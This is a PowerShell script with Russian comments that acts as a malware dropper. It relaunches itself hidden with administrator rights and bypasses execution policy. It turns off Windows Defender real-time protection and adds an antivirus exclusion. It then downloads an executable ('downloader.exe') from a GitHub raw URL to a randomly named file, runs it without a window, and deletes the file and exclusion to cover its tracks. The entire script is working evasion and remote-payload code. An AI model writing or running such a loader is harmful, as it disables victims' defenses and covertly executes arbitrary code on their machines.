# Установка TLS 1.2 для GitHub
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Проверка прав администратора и перезапуск с правами
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $script = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition))
    Start-Process powershell -Verb runAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $script"
    exit
}

# Отключение защиты в реальном времени Windows Defender
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}

# URL файла для скачивания (вставь свою полную ссылку)
$Url = "https://raw.githubusercontent.com/theteslabro/inastaller/blob/main/downloader.exe" # Замени на свой сырой URL с GitHub

# Генерация случайного имени файла
$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
$Output = "$env:TEMP\$RandomName"

# Добавление файла в исключения Windows Defender
try { Add-MpPreference -ExclusionPath $Output -ErrorAction SilentlyContinue } catch {}

# Скачивание
try { Invoke-WebRequest -Uri $Url -OutFile $Output -ErrorAction Stop -UseBasicParsing } catch {}

# Запуск файла без окна
try { Start-Process -FilePath $Output -WindowStyle Hidden -ErrorAction Stop } catch {}

# Очистка следов
try { Remove-Item $Output -Force -ErrorAction SilentlyContinue } catch {}
try { Remove-MpPreference -ExclusionPath $Output -ErrorAction SilentlyContinue } catch {}

# Восстановление Defender
try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}